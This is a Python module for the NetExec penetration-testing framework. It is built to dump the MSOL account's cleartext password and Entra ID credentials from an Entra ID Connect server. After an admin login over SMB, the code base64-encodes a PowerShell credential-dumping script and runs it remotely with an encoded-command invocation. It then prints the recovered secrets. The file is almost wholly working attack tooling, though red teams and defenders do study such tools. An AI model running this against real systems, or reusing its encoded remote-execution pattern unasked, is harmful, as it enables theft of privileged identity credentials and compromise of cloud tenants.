# MSOL module for NetExec
# Author of the module : https://twitter.com/Daahtk
# Based on the article : https://blog.xpnsec.com/azuread-connect-for-redteam/
# Fully rewritten by @NeffIsBack
from base64 import b64encode
from nxc.helpers.misc import CATEGORY
from nxc.helpers.powershell import get_ps_script


class NXCModule:
    """Module by @NeffIsBack"""
    name = "msol"
    description = "Dump MSOL cleartext password and Entra ID credentials from the localDB on the Entra ID Connect Server"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self):
        self.context = None
        self.module_options = None

        self.entra_id_psscript = ""

        with open(get_ps_script("msol_dump/entra-sync-creds.ps1")) as psFile:
            for line in psFile:
                if line.startswith("#") or line.strip() == "":
                    continue
                else:
                    self.entra_id_psscript += line.strip() + "\n"

    def options(self, context, module_options):
        """No module options available."""

    def on_admin_login(self, context, connection):
        psScript_b64 = b64encode(self.entra_id_psscript.encode("UTF-16LE")).decode("utf-8")
        out = connection.execute(f"powershell.exe -e {psScript_b64} -OutputFormat Text", True)

        if "CLIXML" in out:
            out = out.split("CLIXML")[1].split("<Objs Version")[0]

        for line in out.splitlines():
            if not line.strip():
                continue
            if "[!]" in line:
                context.log.fail(line.replace("[!]", "").strip())
            else:
                context.log.highlight(line.strip())
